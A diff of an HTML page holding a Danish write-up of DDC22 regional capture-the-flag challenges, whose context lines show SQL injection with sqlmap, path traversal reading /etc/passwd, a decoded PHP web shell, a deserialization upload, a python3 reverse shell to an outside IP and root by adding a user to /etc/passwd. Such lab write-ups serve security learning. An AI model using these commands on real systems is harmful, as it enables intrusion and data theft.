@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2025-01-21 Tue 19:16 -->
+<!-- 2025-01-21 Tue 21:22 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>DDC22 Regionals | Write-up collection (Danish)</title>
@@ -76,7 +76,7 @@ Jeg klarede 6 opgaver i alt i den regionale del af konkurrencen, og fik med 800 
 Antal point: 50<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="orgd73370f">
+<pre class="example" id="org8ec1600">
 De hemmelige egern er på farten igen med deres nødder og telekinetiske evner.
 Se om du kan finde deres hemmelige config key til deres hjemmeside ssti.hkn
 </pre>
@@ -135,7 +135,7 @@ Og der har vi jo flaget: <code>DDC{SSTI_1n_fl45k_15_wh3r3_7h3_squ1rr3l_h1d3_7h3_
 Antal point: 50<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="orgd6c2b04">
+<pre class="example" id="org373c313">
 Jeg har opdateret min hjemmeside til styring af kontakter og har nu fået lukket sikkerhedshullet i vCard-systemet. Jeg er dog stadig lidt bekymret, da jeg gemmer en del personfølsom data i mine systemer, og jeg vil nødig have, at nogen får adgang til andres konti og kontakter. Vil du tjekke den nye udgave for mig? Så giver jeg en cookie!
 
 http://contacts-vault.hkn
@@ -156,7 +156,7 @@ Man kan se de cookies ens browser gemmer under debug tools og storage:<br>
 <img src="assets/2022-04-14_14-09-02_screenshot.png" alt="2022-04-14_14-09-02_screenshot.png"><br>
 I cookien er der en JSON string hvor vi har et <code>_user_id</code> sat til værdien 6:<br>
 </p>
-<pre class="example" id="org8431c1e">
+<pre class="example" id="org3f6bb3e">
 "{\"_user_id\": \"6\"\054 \"_fresh\": true\054 \"_id\": \"a33260853250b0d0d323433e67e53e64f90ec67a81533f05ee8e64e816f281059ffad6ba117cef8c667a742331a27c09491075ab8a91c1aefb057e21c1cc6824\"}"
 </pre>
 
@@ -178,7 +178,7 @@ DDC{f1x_th4t_c00k1e_vuln_0r_cl0se_th3_b4k3ry}
 Antal point: 200<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org3b0d2d9">
+<pre class="example" id="org00a388a">
 Nu burde alle sikkerhedshullerne på min hjemmeside være lukket, så ingen længere kan se andres kontakter! Er lidt mere tryg nu, jeg har nemlig en super hemmelig kontakt, som ingen må få at se! Den er dog også ekstra beskyttet og kan kun ses direkte fra min admin profil.
 
 Jeg har også forbedret søgefunktionen lidt, så man nemmere kan finde sine kontakter. Vil du hjælpe mig med at tjekke nyeste udgave? Det er bare en formalitet, har næsten ikke ændret noget, men det skal jo gøres. Tak!
@@ -191,7 +191,7 @@ Denne opgave er en fortsættelse på forrige opgave.<br>
 Efter at have patchet forrige fejl, skal vi prøve at finde en ny.<br>
 Brugerfladen er den samme som før, men kigger vi på vores cookies er den ikke længere så let læselig:<br>
 </p>
-<pre class="example" id="org2cb1906">
+<pre class="example" id="orgea0bb56">
 .eJwljjsOAyEMBe9CncIfDGYvszJgK2nZbBXl7kFKM3oavWI-6Yzl1zMd73X7I52vmY5kzFRAhUmgw4TJxJnZS3XZzNHAR6mmKMwB4q7bumIJUgRpETZLN8Q6PHSU_a2ZmNGoDmi5IVSxrtZwoHl0kOq09xhFKacdcl--_jVI6fsDXpwuOQ.YlgREw.OJxo-Kot0pARQLuCN3HPX-aIqNU
 </pre>
 <p>
@@ -247,7 +247,7 @@ sqlmap -u http://contact-vault.hkn/search?s=asd
 <p>
 Istedet kan vi bruge en fil der indeholder en HTTP request.<br>
 </p>
-<pre class="example" id="org0529693">
+<pre class="example" id="orgcb6858a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ cat contact-vault.txt
 GET /search?s=asdf HTTP/1.1
@@ -270,7 +270,7 @@ Denne er samlet op og gemt gennem burp suite.<br>
 Og så kan vi give den til sqlmap med flaget <code>-r</code> for request fil&#x2026;.<br>
 Men af en eller anden årsag virkede dette ikke for mig, grundet en bug i sqlmap skulle give den fulde path til filen, og det tog mig lidt for lang tid at indse til konkurrencen&#x2026; dette kunne dog fikses ved hjælp miljø variable <code>$PWD</code><br>
 </p>
-<pre class="example" id="orgf565b54">
+<pre class="example" id="orgae927f9">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ sqlmap -r $PWD/contact-vault.txt
         ___
@@ -326,7 +326,7 @@ Dette virkede heller ikke&#x2026; på trods af at vi havde bekræftet det selv&#
 Grunden til dette er at sqlmap, kan hvis det ikke bliver brugt forsigtigt potentielt lave meget skade.<br>
 Vi kan sige at vi er ligeglade, og sætte vores level højere og lave et større mængde tests.<br>
 </p>
-<pre class="example" id="orgb7dbcfc">
+<pre class="example" id="org679e3be">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ sqlmap -r $PWD/contact-vault.txt --level=3 --threads=6
         ___
@@ -423,7 +423,7 @@ sqlmap -r $PWD/contact-vault.txt --dump &lt;tabel navn&gt;
 <p>
 Jeg valgte at gå efter kontakterne, og efter et par minutter fik jeg trukket følgende ud fra databasen:<br>
 </p>
-<pre class="example" id="org56ec09f">
+<pre class="example" id="org0c597a1">
 +----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
 | id | user_id | 20 | 80 | 100 | 200 | email                                              | phone                  | FOREIGN | PRIMARY | is_secret | last_name  | first_name |
 +----+---------+----+----+-----+-----+----------------------------------------------------+------------------------+---------+---------+-----------+------------+------------+
@@ -459,7 +459,7 @@ DDC{b3tt3r_f1x_th4t_SQLi_vuln_GDPR_4ud1t_1s_cl0s3}
 Antal point: 100<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org0da8e9d">
+<pre class="example" id="orgf187a2c">
 Du skal nok bare sende en masse requests altså bare-request-amok.hkn:5000
 </pre>
 
@@ -468,7 +468,7 @@ Til denne opgave skulle vi bruteforce et login til en hjemmeside, for derefter a
 Besøger vi siden bliver vi mødt med følgende login:<br>
 </p>
 
-<figure id="org742124e">
+<figure id="org4567f7f">
 <img src="assets/2022-04-14_09-57-27_screenshot.png" alt="2022-04-14_09-57-27_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Login side for opgaven.</figcaption>
@@ -479,7 +479,7 @@ De kære challenge authors, har været så venlige at give os kildekoden til web
 Grunden til det er fedt er at vi så har mulighed for at teste lokalt indtil det virker uden at belaste serveren!<br>
 Vi fik en filen <code>source.zip</code> udleveret med følgende indhold:<br>
 </p>
-<pre class="example" id="orge78f965">
+<pre class="example" id="org8a7e795">
 total 1588
 -rw-r--r-- 1 c3lphie c3lphie    2985 Apr  9 17:56 app.py
 -rw-r--r-- 1 c3lphie c3lphie     961 Dec 13 11:29 directory.txt
@@ -587,7 +587,7 @@ Og <code>requests</code> biblioteket til at håndtere HTTP requests der skulle s
 Jeg vil ikke gå i detaljer omkring mit script da det er relativ simpelt at forstå, men vil anbefale at læse det igennem hvis du ikke har erfaring.<br>
 Kort beskrevet er angrebet design sådan:<br>
 </p>
-<pre class="example" id="orge788cb9">
+<pre class="example" id="org71c0fe5">
 læs passwords fra fil
 læs hiddendirs fra fil
 
@@ -613,7 +613,7 @@ for hver folder i hiddendirs
 <p>
 Køre vi scriptet:<br>
 </p>
-<pre class="example" id="orged8fd90">
+<pre class="example" id="orgc9d450a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/request_amok ]
 └─&gt; $ time python3 solve.py
 /home/c3lphie/hacking/ctf/ddc22/regionals/request_amok/solve.py:18: GuessedAtParserWarning: No parser was explicitly specified, so I'm using the best available HTML parser for this system ("html5lib"). This usually isn't a problem, but if you run this code on another system, or in a different virtual environment, it may use a different parser and behave differently.
@@ -698,7 +698,7 @@ brute_dir(adm_pass, csrf)
 Antal point: 100<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org441a995">
+<pre class="example" id="org7c018dd">
 På urlParse.hkn 9000, kan du netcat til server og finde et simpelt program, der tager en url som input, som indeholder et brugernavn og en adgangskode, og derefter spytter dem tilbage efter dig. URL’en er af denne form:
 
  http://bruger:password@somehost.com
@@ -763,7 +763,7 @@ Herefter finder den længderne for brugernavnet og passwordet i urllen.<br>
 Hvorefter den skriver urllen til stdout, problemet her er dog at vi styre størrelsen af det den skriver ud.<br>
 Dette betyder at vi kan læse dele af hukommelsen ved at læse uden for variablen <code>field</code>'s hukommelses område.<br>
 </p>
-<pre class="example" id="org91daace">
+<pre class="example" id="org063422b">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
 └─&gt; $ ./urlParse
 http://AAAAAAAAAAAAAAAAAA:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@asdfasfd.asdfaf
@@ -773,7 +773,7 @@ ygd{WO%
 <p>
 Prøver vi dette på remote:<br>
 </p>
-<pre class="example" id="org1bc4a24">
+<pre class="example" id="orgcbb4919">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/urlparse/sourceAndBinary ]
 └─&gt; $ nc urlparse.hkn 9000
 http://A:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -799,7 +799,7 @@ DDC{dsABxVLqOC}
 Antal point: 300<br>
 Beskrivelse:<br>
 </p>
-<pre class="example" id="org19fa417">
+<pre class="example" id="org281a212">
 hallo kan du lige tjekke mrbeefs bestilling ud på http://mrbeefs-bestilling.hkn ???
 </pre>
 
@@ -807,7 +807,7 @@ hallo kan du lige tjekke mrbeefs bestilling ud på http://mrbeefs-bestilling.hkn
 Da denne opgave er i kategorien <b>boot2root</b>, så brugte jeg samme tilgang som jeg bruger på maskiner fra hackhebox.<br>
 Så jeg startede med at køre <code>nmap</code>:<br>
 </p>
-<pre class="example" id="orga732fff">
+<pre class="example" id="org4c4a34c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ cat nmap/all_ports.nmap
 # Nmap 7.92 scan initiated Sat Apr  9 11:10:58 2022 as: nmap -sS -n -Pn -p- -oA nmap/all_ports mrbeefs-bestilling.hkn
@@ -843,7 +843,7 @@ Her fra spekulerede jeg på om der måske var en Local File Inclusion fejl i app
 Så istedet for at spørge om <code>mrbeef.png</code>, så prøvede jeg <code>../../../../../../etc/passwd</code> hvorefter jeg decodede indholdet.<br>
 For at gøre det så nemt som muligt, lavede jeg denne oneliner:<br>
 </p>
-<pre class="example" id="orgbf14af9">
+<pre class="example" id="orgfb975ad">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../../../../../../etc/passwd' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -874,7 +874,7 @@ mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
 Og der har vi indholdet af <code>passwd</code> filen.<br>
 Dette kunne vi bruge til at skaffe kildekoden for hjemmesiden:<br>
 </p>
-<pre class="example" id="orga8446ce">
+<pre class="example" id="org085d736">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl 'http://mrbeefs-bestilling.hkn/file.php?file=../index.php' -S | cut -d "," -f 2 | cut -d "&gt;" -f 1 | base64 -d
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -897,7 +897,7 @@ Great Success!!<br>
 <p>
 Jeg downloadede herefter de andre filer:<br>
 </p>
-<pre class="example" id="orga5e2cc3">
+<pre class="example" id="org0e5bc62">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ ls -l php_files
 total 12
@@ -1005,14 +1005,14 @@ Det viser sig at challenge authored havde glemt at fjerne hans egen bagdør inde
 <img src="assets/2022-04-14_17-25-15_screenshot.png" alt="2022-04-14_17-25-15_screenshot.png"><br>
 Filen <code>evil.png.png.bak</code> er en PHP shell, men pakket ind sådan at at det passer med PHP klassen.<br>
 </p>
-<pre class="example" id="org5113e82">
+<pre class="example" id="orgf3c3459">
 O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"evil.png.png";s:11:"filecontent";s:724:"TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9";s:13:"fileextension";N;s:9:"extension";s:3:"png";}
 </pre>
 
 <p>
 Hvis vi base64 dekoder <code>filecontent</code>, får vi et nyt serialiseret objekt.<br>
 </p>
-<pre class="example" id="org559a6fc">
+<pre class="example" id="org83ea784">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ echo TzoxODoiZmlsZXVwbG9hZGVkYmFja3VwIjo0OntzOjg6ImZpbGVuYW1lIjtzOjEyOiJ2ZXJ5Y29vbC5waHAiO3M6MTE6ImZpbGVjb250ZW50IjtzOjQwMDoiUEdoMGJXdytDanhpYjJSNVBnbzhabTl5YlNCdFpYUm9iMlE5SWtkRlZDSWdibUZ0WlQwaVBEOXdhSEFnWldOb2J5QmlZWE5sYm1GdFpTZ2tYMU5GVWxaRlVsc25VRWhRWDFORlRFWW5YU2s3SUQ4K0lqNEtQR2x1Y0hWMElIUjVjR1U5SWxSRldGUWlJRzVoYldVOUltTnRaQ0lnWVhWMGIyWnZZM1Z6SUdsa1BTSmpiV1FpSUhOcGVtVTlJamd3SWo0S1BHbHVjSFYwSUhSNWNHVTlJbE5WUWsxSlZDSWdkbUZzZFdVOUlrVjRaV04xZEdVaVBnbzhMMlp2Y20wK0NqeHdjbVUrQ2p3L2NHaHdDaUFnSUNCcFppaHBjM05sZENna1gwZEZWRnNuWTIxa0oxMHBLUW9nSUNBZ2V3b2dJQ0FnSUNBZ0lITjVjM1JsYlNna1gwZEZWRnNuWTIxa0oxMHBPd29nSUNBZ2ZRby9QZ284TDNCeVpUNEtQQzlpYjJSNVBnbzhMMmgwYld3KyI7czoxMzoiZmlsZWV4dGVuc2lvbiI7TjtzOjk6ImV4dGVuc2lvbiI7czo0OiIucGhwIjt9 | base64 -d
 O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"filecontent";s:400:"PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+";s:13:"fileextension";N;s:9:"extension";s:4:".php";}%
@@ -1022,7 +1022,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"fileconten
 <p>
 Og kigger vi igen på hvad den bliver lavet om til får vi en PHP web shell:<br>
 </p>
-<pre class="example" id="org38fdca2">
+<pre class="example" id="org942596b">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ echo "PGh0bWw+Cjxib2R5Pgo8Zm9ybSBtZXRob2Q9IkdFVCIgbmFtZT0iPD9waHAgZWNobyBiYXNlbmFtZSgkX1NFUlZFUlsnUEhQX1NFTEYnXSk7ID8+Ij4KPGlucHV0IHR5cGU9IlRFWFQiIG5hbWU9ImNtZCIgYXV0b2ZvY3VzIGlkPSJjbWQiIHNpemU9IjgwIj4KPGlucHV0IHR5cGU9IlNVQk1JVCIgdmFsdWU9IkV4ZWN1dGUiPgo8L2Zvcm0+CjxwcmU+Cjw/cGhwCiAgICBpZihpc3NldCgkX0dFVFsnY21kJ10pKQogICAgewogICAgICAgIHN5c3RlbSgkX0dFVFsnY21kJ10pOwogICAgfQo/Pgo8L3ByZT4KPC9ib2R5Pgo8L2h0bWw+" | base64 -d
 &lt;html&gt;
@@ -1047,7 +1047,7 @@ Og kigger vi igen på hvad den bliver lavet om til får vi en PHP web shell:<br>
 Så hvis vi prøver at gendanne denne fil fra backup 2 gange, så får vi vores egen shell på maskinen!<br>
 Dette kan gøre ved hjælp af 2 curl kommandoer:<br>
 </p>
-<pre class="example" id="orgdc7213a">
+<pre class="example" id="orgc1fc632">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=evil.png.png.bak"
 &lt;html&gt;
@@ -1087,7 +1087,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:12:"verycool.php";s:11:"fileconten
 <p>
 Vi kan bekræfte t det virkede ved at se indholdet af <code>images/</code> mappen:<br>
 </p>
-<pre class="example" id="orgbb977c9">
+<pre class="example" id="orga56c57c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/" -s | grep -E "(png|php)" | cut -d '"' -f 8
 evil.png.png
@@ -1144,7 +1144,7 @@ Vi skal serialiserer et objekt så det er identisk med ethvert andet objekt, der
 Så jeg kopierede klassen over, og i mit script og smed indholdet af de funktioner ud.<br>
 Efter at lave et objekt, og sætte filindholdet til at være en PHP webshell er jeg pretty much good to go!<br>
 </p>
-<pre class="example" id="orgb6824b5">
+<pre class="example" id="org04f4ce8">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ php exploit_class.php &gt; serial.png
 
@@ -1153,7 +1153,7 @@ Efter at lave et objekt, og sætte filindholdet til at være en PHP webshell er 
 <p>
 Nu skal vi bare uploade <code>serial.png</code>, og prøve at lave backup fra den fil!<br>
 </p>
-<pre class="example" id="org41d8d3d">
+<pre class="example" id="orga380049">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/upload.php?frombackup=../images/serial.png"
 &lt;html&gt;
@@ -1175,7 +1175,7 @@ O:18:"fileuploadedbackup":4:{s:8:"filename";s:9:"shell.php";s:11:"filecontent";s
 <p>
 Og så har vi en web shell ved <code>/images/shell.php</code><br>
 </p>
-<pre class="example" id="org3212489">
+<pre class="example" id="org57ec6c5">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals/mr_beefs_bestilling ]
 └─&gt; $ curl "http://mrbeefs-bestilling.hkn/images/shell.php?cmd=whoami"
 Status code: 0
@@ -1194,14 +1194,14 @@ Nu kan vi lave en reverse shell og få en stabil forbindelse med vores mål!<br>
 Efter at snuse lidt omkring, fandt jeg ud af at der var <code>python3</code> på serveren.<br>
 Så jeg brugte denne <code>python3</code> reverse shell:<br>
 </p>
-<pre class="example" id="orgcdceb81">
+<pre class="example" id="org7189373">
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("25.153.240.226",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 </pre>
 <p>
 Gennem browseren da curl ikke lige funkede&#x2026;<br>
 I baggrunden havde jeg en netcat server kørende på port 1337, hvor der efterfølgende kom forbindelse igennem.<br>
 </p>
-<pre class="example" id="org68d6a46">
+<pre class="example" id="orga1f4f4a">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/ddc22/regionals ]
 └─&gt; $ nc -lnvp 1337
 Connection from 25.153.240.1:51454
@@ -1213,7 +1213,7 @@ $
 Med en mere solid shell, kan vi kigge lidt omkring på fil systemet!<br>
 I <code>mrbeef</code>'s hjemme folder, kan vi finde et password!<br>
 </p>
-<pre class="example" id="org8a7fc40">
+<pre class="example" id="org257850d">
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@1fe46c6cc223:/home/mrbeef$ ls -la
 ls -la
@@ -1277,7 +1277,7 @@ www-data@1fe46c6cc223:/home/mrbeef$
 Efter et fejl forsøg på at bruge <code>sudo</code> kommer han til at leake sin kode: <code>givmigbeef1337</code>!<br>
 </p>
 
-<pre class="example" id="orgfdca6aa">
+<pre class="example" id="org34b1968">
 www-data@1fe46c6cc223:/home/mrbeef$ su mrbeef
 su mrbeef
 Password: givmigbeef1337
@@ -1291,7 +1291,7 @@ mrbeef@1fe46c6cc223:~$
 En anden ting af interesse i bash historien er <code>kobebeef.py</code> scriptet.<br>
 Hvis vi studere indholdet kan vi se at der læses fra filen <code>beef.txt</code>, og bliver skrevet i den fil vi angiver som argument:<br>
 </p>
-<pre class="example" id="org1ff5a4c">
+<pre class="example" id="org7286b53">
 mrbeef@1fe46c6cc223:~$ cat kobebeef.py
 cat kobebeef.py
 import sys
@@ -1309,7 +1309,7 @@ with open(tobeef,"w") as outp:
 Dette kan bruges til at elavere vores rolle på serveren!<br>
 For at forstå hvordan, er det vigtigt at kigge på hvem der har adgang til filerne!<br>
 </p>
-<pre class="example" id="org27a711a">
+<pre class="example" id="org1d72a06">
 mrbeef@1fe46c6cc223:~$ ls -l
 ls -l
 total 8
@@ -1321,7 +1321,7 @@ mrbeef@1fe46c6cc223:~$
 Se, vi kan både læse og skrive til <code>beef.txt</code>, men kun læse <code>kobebeef.py</code>.<br>
 Og scriptet er det eneste vi kan køre med <code>sudo</code>:<br>
 </p>
-<pre class="example" id="orge3fa6e6">
+<pre class="example" id="org72c58ee">
 mrbeef@1fe46c6cc223:~$ sudo -l
 sudo -l
 [sudo] password for mrbeef: givmigbeef1337
@@ -1338,7 +1338,7 @@ mrbeef@1fe46c6cc223:~$
 Vi kan ved at ændre i <code>/etc/passwd</code> tilføje en ny root bruger og dermed få root på systemet.<br>
 Dette er muligt da vi kan kopiere <code>passwd</code> filen ind i <code>beef.txt</code>:<br>
 </p>
-<pre class="example" id="orgbb4155d">
+<pre class="example" id="orgc9019af">
 mrbeef@1fe46c6cc223:~$ cp /etc/passwd beef.txt
 cp /etc/passwd beef.txt
 mrbeef@1fe46c6cc223:~$ cat beef.txt
@@ -1367,7 +1367,7 @@ mrbeef:x:1000:1000::/home/mrbeef:/bin/sh
 <p>
 Nu kan vi tilføje vores egen bruger, først laver vi et password med <code>openssl</code>, dette indsættes i vores egen række i <code>beef.txt</code> sådan det passer med de andre linjer:<br>
 </p>
-<pre class="example" id="orgf05e92f">
+<pre class="example" id="orgce3ef1f">
 mrbeef@1fe46c6cc223:~$ openssl passwd -1 -salt hacker hacker
 openssl passwd -1 -salt hacker hacker
 $1$hacker$TzyKlv0/R/c28R.GAeLw.1
@@ -1379,7 +1379,7 @@ mrbeef@1fe46c6cc223:~$ echo -n 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:/roo
 Nu skal vi bare køre <code>kobebeef.py</code> med <code>sudo</code> og <code>/etc/passwd</code> som argument.<br>
 Herefter kan vi skifte til hacker brugeren.<br>
 </p>
-<pre class="example" id="orge8ef32c">
+<pre class="example" id="orgf8c5658">
 mrbeef@1fe46c6cc223:~$ sudo /usr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
 &lt;sr/bin/python3 /home/mrbeef/kobebeef.py /etc/passwd
 mrbeef@1fe46c6cc223:~$ su hacker
@@ -1394,7 +1394,7 @@ root
 <p>
 Nu skal vi blot navigere hen til root folder og finde flaget:<br>
 </p>
-<pre class="example" id="org93ca7e6">
+<pre class="example" id="orgd8d4ae0">
 # cd /root
 cd /root
 # ls
